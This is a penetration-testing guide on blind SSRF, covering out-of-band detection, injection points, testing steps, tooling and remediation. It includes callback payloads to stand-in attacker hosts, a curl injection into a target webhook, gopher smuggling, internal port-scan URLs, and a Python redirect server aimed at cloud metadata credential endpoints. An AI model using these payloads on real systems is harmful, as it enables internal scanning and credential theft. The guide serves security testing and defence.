# Blind SSRF (Out-of-Band Detection)

## Overview
Blind SSRF is a variant where the server makes the attacker-triggered request but does not return any part of the response to the attacker — making direct data exfiltration impossible through the primary channel. Detection therefore relies entirely on out-of-band (OOB) techniques: the attacker monitors an external DNS/HTTP listener for callbacks that confirm the server made the request. Despite being "blind", this class of vulnerability is still critical because it can be chained with other weaknesses (e.g., internal service exploitation via Gopher, metadata credential theft with timing oracles, or upgrades to full RCE).

## How It Works
The vulnerable application receives a URL from the attacker, hands it to an HTTP client, and discards (or never reflects) the resulting response. The attacker cannot see what the server received. However, when the server resolves the hostname in the attacker's URL, a DNS query hits the attacker's authoritative DNS server, and if the server connects, an HTTP request follows. By embedding unique tokens in the subdomain or path (e.g., `ssrf-test-1234.attacker.com`), the attacker can correlate callbacks to specific injection points and confirm exploitation without seeing any response body.

## Impact
- Confirm SSRF vulnerability for further exploitation planning
- Perform internal port scanning via timing side-channels (different delays for open vs. closed ports)
- Trigger requests to internal services to exploit unauthenticated endpoints (Redis flushall via Gopher, etc.)
- Exfiltrate data via DNS — embed data in subdomain labels (e.g., `EXFIL-DATA.attacker.com`)
- Chain with redirect servers to bounce to sensitive endpoints after blind confirmation
- Demonstrate attack surface for business-impact reporting even without direct data extraction

## Where to Look
- Webhook URL fields (payment processors, notification settings, integrations)
- Asynchronous import/export features (CSV import, document conversion jobs)
- Email notification settings that ping external URLs
- URL parameters in API requests that trigger server-side fetching
- Image URL fields in profile settings (avatar, product image)
- "Test connection" or "Ping" buttons in admin integration panels
- `X-Forwarded-For`, `Host`, `Referer`, `Origin` headers (server may log and later fetch these)
- PDF/HTML-to-image rendering pipelines (requests happen asynchronously)
- Background job queues that process URLs submitted in forms

## Testing Steps
1. Set up an OOB listener. Options:
   - Burp Suite Pro: Burp > Burp Collaborator client > Copy to clipboard
   - interactsh: run `interactsh-client` and copy the generated URL
   - Your own VPS: run `python3 -m http.server 80` and `tcpdump -i eth0 port 53`
2. For each suspected injection point, replace the URL value with your OOB URL: `http://unique-id.YOUR-OOB-HOST/`.
3. Submit the request and wait 5–30 seconds (async jobs may be delayed).
4. Check your OOB listener for DNS lookups or HTTP requests.
5. If a callback arrives, note the source IP (the application server's IP) and the full request path.
6. To test internal port accessibility, send payloads targeting internal IPs while monitoring timing differences:
   - Open port: fast TCP handshake, possible HTTP response (even if discarded), short delay
   - Closed port: TCP RST immediately, very short delay
   - Filtered port: SYN timeout, long delay (~20–30 s)
7. Use unique subdomains per injection point (`param1.uid.oob.host`, `param2.uid.oob.host`) to pinpoint the vulnerable parameter.
8. Attempt to upgrade to data exfiltration via DNS:
   - Use a redirect server that bounces to an internal URL
   - Or use Gopherus to craft Gopher payloads that interact with internal services

## Payloads / Techniques

```
# OOB callback payloads — replace YOUR-OOB-HOST
http://ssrf-test.YOUR-OOB-HOST/
http://ssrf-test.YOUR-OOB-HOST/path?debug=1
https://ssrf-test.YOUR-OOB-HOST/

# Unique per-parameter tokens for correlation
http://param-url.uid1234.YOUR-OOB-HOST/
http://header-host.uid1234.YOUR-OOB-HOST/

# DNS-based data exfiltration via blind SSRF + redirect
# Step 1: Set up redirect server at attacker.com/redir pointing to:
#   http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Step 2: Extract returned data by encoding it in DNS subdomains
# (requires a chained exploit — see ssrf_cloud_metadata.md)

# Port scanning via blind SSRF (observe HTTP response time)
http://127.0.0.1:22/      # SSH — if open, fast connection
http://127.0.0.1:6379/    # Redis
http://127.0.0.1:9200/    # Elasticsearch
http://127.0.0.1:3306/    # MySQL

# Protocol smuggling (if app passes scheme through)
gopher://YOUR-OOB-HOST:80/_GET%20/%20HTTP/1.0%0d%0a%0d%0a
```

```bash
# interactsh setup
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client -v
# Output: [INF] Listing on oasfd123.oast.pro ...

# Use the generated host in payloads
curl -s "https://target.com/webhook/test" \
  -d '{"url":"http://oasfd123.oast.pro/blind-ssrf-test"}'

# Simple OOB listener on VPS
python3 -c "
import http.server, socketserver
class H(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f'[SSRF] {self.client_address[0]} {self.path}')
        self.send_response(200); self.end_headers()
socketserver.TCPServer(('0.0.0.0', 80), H).serve_forever()
"

# DNS capture on VPS
tcpdump -i eth0 -n port 53 -l 2>/dev/null | grep YOUR-DOMAIN
```

```python
# Redirect server for chaining blind SSRF to sensitive endpoints
from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        # Redirect to cloud metadata or internal service
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), RedirectHandler).serve_forever()
```

## Burp Suite Tips
- **Burp Collaborator** is the primary tool: each generated URL is unique and Burp correlates DNS + HTTP interactions back to the specific request that triggered them.
- Use **Collaborator Everywhere** extension — it automatically inserts Collaborator URLs into every parameter and header in every request passing through the proxy.
- In **Repeater**, replace URL values with Collaborator URLs and click "Poll now" in the Collaborator client after sending.
- For async features (background jobs), poll Collaborator for several minutes after submission.
- Use **Logger++** to track which exact parameter is being tested and correlate with Collaborator interaction timestamps.
- **Intruder** with a Collaborator-generated URL payload and unique position markers can sweep multiple parameters simultaneously.

## Tools
- Burp Suite Pro — Collaborator client
- interactsh (https://github.com/projectdiscovery/interactsh) — open-source OOB platform
- canarytokens.org — quick DNS/HTTP token generation for manual testing
- SSRFmap (https://github.com/swisskyrepo/SSRFmap)
- Gopherus (https://github.com/tarunkant/Gopherus) — craft exploit payloads once SSRF confirmed
- Nuclei with `ssrf-blind` templates

## Remediation
- Apply the same remediations as for regular SSRF: strict URL allowlisting, IP validation after DNS resolution, blocked internal ranges.
- Even "blind" SSRF is exploitable — do not dismiss it because responses are not reflected.
- Implement egress firewall rules to block the application server from reaching internal networks and cloud metadata endpoints.
- Use IMDSv2 on AWS EC2 to require a session token (PUT request first), preventing simple GET-based SSRF metadata exploitation.
- Log all outbound HTTP requests made by the application and alert on connections to RFC1918 or loopback addresses.

## References
https://portswigger.net/web-security/ssrf/blind
https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#blind-ssrf
https://interactsh.com/
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#blind-ssrf
